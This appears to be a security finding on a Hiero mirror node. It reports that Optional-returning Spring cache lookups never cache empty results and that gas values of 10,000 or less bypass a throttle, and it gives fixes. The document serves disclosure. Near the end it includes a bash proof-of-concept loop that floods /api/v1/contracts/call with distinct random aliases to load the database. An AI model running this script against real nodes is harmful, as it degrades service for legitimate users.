### Title
Unbounded DB Query Amplification via Uncached Negative Alias Lookups in `CACHE_NAME_ALIAS`

### Summary
`EntityRepository.findByEvmAddressOrAliasAndDeletedIsFalse` uses `@Cacheable` with `unless = "#result == null"`. Because the method returns `Optional<Entity>`, Spring Cache unwraps the Optional before evaluating the condition — an `Optional.empty()` (no entity found) is treated as `null` and is therefore **never stored in the cache**. Any `eth_call` that triggers alias resolution for a non-existent address will unconditionally execute a full DB query on every invocation. Combined with a global (non-per-IP) rate limit of 500 req/s and a gas-throttle bypass for `gas ≤ 10,000`, an unprivileged attacker can sustain hundreds of uncached DB queries per second with a moderate request rate.

### Finding Description

**Exact code location:**

`web3/src/main/java/org/hiero/mirror/web3/repository/EntityRepository.java`, lines 39–49:
```java
@Cacheable(
        cacheNames = CACHE_NAME_ALIAS,
        cacheManager = CACHE_MANAGER_ENTITY,
        key = "@spelHelper.hashCode(#alias)",
        unless = "#result == null")          // ← root cause
@Query(value = """
        select *
        from entity
        where (evm_address = ?1 or alias = ?1) and deleted is not true
        """, nativeQuery = true)
Optional<Entity> findByEvmAddressOrAliasAndDeletedIsFalse(byte[] alias);
```

**Root cause:** Spring Cache with an `Optional`-returning method unwraps the Optional before evaluating `unless`. `Optional.empty()` is unwrapped to `null`, so the condition `#result == null` is `true` and the empty result is **never written to the cache**. Every subsequent call with the same non-existent alias re-executes the DB query.

**Cache configuration** (`CacheProperties.java`, line 19 / `EvmConfiguration.java`, lines 99–105):
```
expireAfterWrite=1s, maximumSize=10000
```
The 1-second TTL is already very short; the missing-negative-cache issue makes it completely ineffective for non-existent aliases.

**Call path into the vulnerable method:**

`ContractController.call()` → `ContractExecutionService.processCall()` → EVM execution → Hedera precompile (HTS/HRC) → `CommonEntityAccessor.get(AccountID, timestamp)` → `CommonEntityAccessor.get(Bytes alias, timestamp)` (`CommonEntityAccessor.java`, lines 46–50) → `entityRepository.findByEvmAddressOrAliasAndDeletedIsFalse(alias.toByteArray())`.

**Throttle bypass** (`ThrottleProperties.java`, lines 42–47):
```java
public long scaleGas(long gas) {
    if (gas <= GAS_SCALE_FACTOR) {   // GAS_SCALE_FACTOR = 10_000
        return 0L;                   // consuming 0 tokens always succeeds
    }
    ...
}
```
Setting `gas ≤ 10,000` in the request causes `gasLimitBucket.tryConsume(0)` which always returns `true`, completely bypassing the gas-per-second throttle. Only the global 500 req/s rate limit applies, and it is not per-IP.

### Impact Explanation
At the default 500 req/s global rate limit, an attacker sustains 500 uncached `SELECT * FROM entity WHERE (evm_address = ?1 OR alias = ?1) AND deleted IS NOT TRUE` queries per second against the database. This OR-on-two-columns query requires index scans on both `evm_address` and `alias` columns for every request. Sustained at this rate with distinct alias values (preventing any in-flight deduplication), DB CPU rises proportionally. A single attacker consuming the full 500 req/s budget can crowd out legitimate traffic and push DB CPU well above the 30% threshold. The rate limit is global and not per-IP, so no IP-level mitigation exists.

### Likelihood Explanation
The attack requires no credentials, no special protocol knowledge, and no on-chain state. Any caller can POST to `/api/v1/contracts/call` with `gas=0` (or any value ≤ 10,000) and a `data` field that encodes a call to a Hedera precompile (e.g., HRC-632 `isValidAlias`, HTS functions) passing a randomly generated 20-byte EVM address as an alias argument. The alias values need only be distinct to prevent any accidental cache hits. The attack is trivially scriptable, repeatable indefinitely, and requires no privileged access.

### Recommendation
1. **Cache negative results:** Change `unless = "#result == null"` to `unless = "#result != null && !#result.isPresent()"` — or equivalently use `unless = "!#result.isPresent()"` — so that `Optional.empty()` results are also stored in the cache, preventing repeated DB hits for the same non-existent alias.
2. **Increase cache TTL or add a dedicated negative-result cache** with a longer TTL (e.g., 30s–60s) for non-existent aliases.
3. **Add per-IP rate limiting** in addition to the global bucket so a single client cannot consume the entire 500 req/s budget.
4. **Fix the gas-throttle bypass:** Enforce a minimum gas floor (e.g., 21,000) before the `scaleGas` division, or treat `scaleGas(gas) == 0` as consuming at least 1 token.

### Proof of Concept

```bash
# Generate N distinct random 20-byte EVM addresses (none exist in DB)
# Call HRC-632 isValidAlias precompile with each as the alias argument
# gas=0 bypasses the gas-per-second throttle

for i in $(seq 1 500); do
  ALIAS=$(python3 -c "import secrets; print('0x' + secrets.token_hex(20))")
  # isValidAlias(address) selector = 0xxxxxxxXX, encode alias as ABI address param
  DATA="0x$(python3 -c "
import secrets
alias = secrets.token_hex(20)
# isValidAlias selector from HRC632
selector = 'b2a31da4'
padded = alias.zfill(64)
print(selector + padded)
")"
  curl -s -X POST http://<mirror-node>/api/v1/contracts/call \
    -H 'Content-Type: application/json' \
    -d "{\"to\":\"0x0000000000000000000000000000000000000167\",
         \"gas\":0,
         \"data\":\"$DATA\",
         \"block\":\"latest\"}" &
done
wait
# Repeat in a loop; observe DB CPU climbing with each wave of 500 req/s
# Each request misses CACHE_NAME_ALIAS and executes a full entity table query
```

**Expected result:** DB CPU increases proportionally to request rate. Each request for a distinct non-existent alias executes `SELECT * FROM entity WHERE (evm_address = ?1 OR alias = ?1) AND deleted IS NOT TRUE` with no cache protection, because `Optional.empty()` is never stored in `CACHE_NAME_ALIAS` due to `unless = "#result == null"`.
